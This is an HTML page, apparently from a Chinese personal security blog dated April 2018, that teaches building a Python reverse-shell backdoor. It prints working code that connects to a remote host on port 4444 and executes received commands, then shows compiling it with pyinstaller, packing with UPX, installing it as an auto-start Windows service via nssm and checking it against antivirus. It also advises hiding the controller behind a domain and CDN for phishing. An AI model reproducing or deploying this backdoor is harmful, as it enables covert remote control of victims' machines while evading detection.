@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<head>
+
+	<title>poions blog</title>
+	<meta name="keywords" content="" />
+	<meta name="description" content="" />
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<link href="/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+	<link href="/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<link href="/css/templatemo_style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+	<div class="templatemo-logo visible-xs-block">
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 black-bg logo-left-container">
+			<h1 class="logo-left">Black</h1>
+		</div>
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 white-bg logo-right-container">
+			<h1 class="logo-right">White</h1>
+		</div>
+	</div>
+	<div class="templatemo-container">
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 black-bg left-container">
+			<h1 class="logo-left hidden-xs margin-bottom-60">Black</h1>
+			<div class="tm-left-inner-container">
+				<ul class="nav nav-stacked templatemo-nav">
+				  <li><a href="\index.html"><i class="fa fa-home fa-medium"></i>首页</a></li>
+				  <li><a href="\web.html" class="active"><i class="fa fa-shopping-cart fa-medium"></i>Web安全</a></li>
+				  <li><a href="\ctf.html"><i class="fa fa-send-o fa-medium"></i>CTF</a></li>
+				  <li><a href="\zawen.html"><i class="fa fa-comments-o fa-medium"></i>杂文</a></li>
+				  <li><a href="\contact.html"><i class="fa fa-envelope-o fa-medium"></i>联系方式</a></li>
+				</ul>
+			</div>
+		</div>
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 white-bg right-container">
+			<h1 class="logo-right hidden-xs margin-bottom-60">White</h1>
+			<div class="tm-right-inner-container">
+				<h1 class="templatemo-header"><strong>简单rootkit玩法</strong></h1>
+				<article class="templatemo-item">
+				 </br>
+				<h1 class="templatemo-header"><strong>0x01 概述</strong></h1>
+				<span>
+					<strong>
+				<font face="verdana" color="green">简单地说，Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。Rootkit通过加载特殊的驱动，修改系统内核，进而达到隐藏信息的目的。
+				而在早期的网络攻击后门隐藏手段中，多数讲病毒后门文件伪装成系统文件欺骗用户肉眼的检测；时至今日各大杀毒软件后门侦查技术查杀规则越来越严谨的情况下落后的后门隐藏技术已不再吃香。但是今天要讲的是传统的后门隐藏方式：利用后门打包成进程服务加上利用socket编写的通信方式绕过杀软检测。</font>
+				</strong>
+			</br>
+			<br />
+			<br />
+
+			<!--
+		 <h1 class="templatemo-header"><strong>0x02 前言</strong></h1>
+		 <p>
+			 通过python编写一个socket通信方式的后门，利用windows系统下进程服务打包的api将后门打包成服务实现开机自启动和界面隐藏。
+		 </p>
+
+			</br>
+			<hr />
+		</br>
+	-->
+
+
+		<h1 class="templatemo-header"><strong>0x02 编写python后门</strong></h1>
+		<strong>
+
+			<br />利用python建立socket通信进行反向链接的形式打造后门
+		</strong>
+		<p>shell.py:</p>
+			<pre>
+import sys
+import time
+import socket
+import subprocess
+
+def connectHost(hosts,ports):
+	try:
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			sock.connect((hosts,int(ports)))
+			while True:
+			try:
+				   data = sock.recv(1024)
+				   data = data.decode('utf-8')
+				   comRst = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+				   m_stdout, m_stderr = comRst.communicate()
+				   sock.send(m_stdout.decode(sys.getfilesystemencoding()).encode('utf-8'))
+				   time.sleep(1)
+			except:
+				   break
+	except:
+				 pass
+	#sock.close()
+
+if __name__=='__main__':
+	while True:
+			connectHost('172.16.105.54','4444')
+			</pre>
+
+			<p>利用socket向远程服务器递交通信请求然后用subprocess模块处理接收远程服务器返回信息；最后本地执行命令后返回数据至远程服务器。利用的方式有很多种个人非常喜欢通过域名解析来配合使用，将socket通信发至域名，域名解析至远程服务器也可以把域名接入cdn来隐匿真实服务器地址加速通信。</p>
+			<img src="images\20180329140602.jpg" alt="frist" class="img-thumbnail">
+
+			<p>后续工作利用pyinstaller讲脚本编译成exe文件，由于使用到的模块较多编译后文件会比C++写的后门大好几倍，这种情况下就体现python写后门不好的地方。当然喜欢用python写的人可以利用UPX加壳压缩文件体积。</p>
+			<img src="images\20180413151101.jpg" alt="frist" class="img-thumbnail">
+			<p>打包完成运行后，远程服务器先监听自己的端口，监听利用工具选择很多这里使用nc监听。</p>
+			<img src="images\20180413151241.jpg" alt="frist" class="img-thumbnail">
+			<p>然后客户端将会像远程服务器指定端口发送通信连接</p>
+			<img src="images\20180413151325.jpg" alt="frist" class="img-thumbnail">
+			<p>最后完成通信，成功反弹一个shell回服务器，执行命令看看；这里测试用的本机内网地址，远程反弹shell建议使用域名配合使用，最终该种方法可以做成远控管理工具。</p>
+			<hr />
+		</br>
+		<h1 class="templatemo-header"><strong>0x03 利用nssm进程服务打包</strong></h1>
+			<p>使用方式:</p>
+			<pre>
+安装服务：  nssm.exe install test C:\Users\Administrator\Desktop\shell.exe
+启动服务：  nssm.exe start test
+删除服务：  nssm remove test confirm
+				</pre>
+				<p></p>
+				<img src="images\20180413151909.jpg" alt="frist" class="img-thumbnail">
+				<p>运行---services.msc 查看到服务完成并自启动。</p>
+				<img src="images\20180413151931.jpg" alt="frist" class="img-thumbnail">
+				<p>服务端立马获取到上线主机，主控机跟被控机进入通信状态，被控机接取主控机任何命令并执行</p>
+				<img src="images\20180413152004.jpg" alt="frist" class="img-thumbnail">
+				<p>最后利用360杀毒软件查杀一下看看能否检测出什么问题，在获取到服务器高权限的情况下配合此类的手法和powershell远程下载形式能使这种后门钓鱼攻击危害更高</p>
+				<img src="images\20180413152345.jpg" alt="frist" class="img-thumbnail">
+				</br>
+
+				<h1 class="templatemo-header"><strong>0x04 结语</strong></h1>
+					<p>一个好的后门并不是功能模块有多少而是能否彻底隐匿在系统而不被发现;看过一位大神介绍了各种后门种类，分析得出后门隐匿更多的是靠思路，而技术只占其中小一部分
+					notepad++后门、openssh后门、Powershell后门、shift后门等等，都是通过利用用户信任的功能进行伪造，因此在安全这方面，普通用户对网络安全知识的缺失极其容易被注入后门程序。</p>
+						<br>
+<hr/>
+			</br>
+			</br>
+						by<span class="blue">：2018年4月13号</span><span class="green">下午4点钟</span>.</p>
+				<br/>
+
+
+
+		<!-- 文章修改 -->
+
+
+
+				</footer>
+			</div>
+		</div> <!-- right section -->
+	</div>
+</body>
+</html>
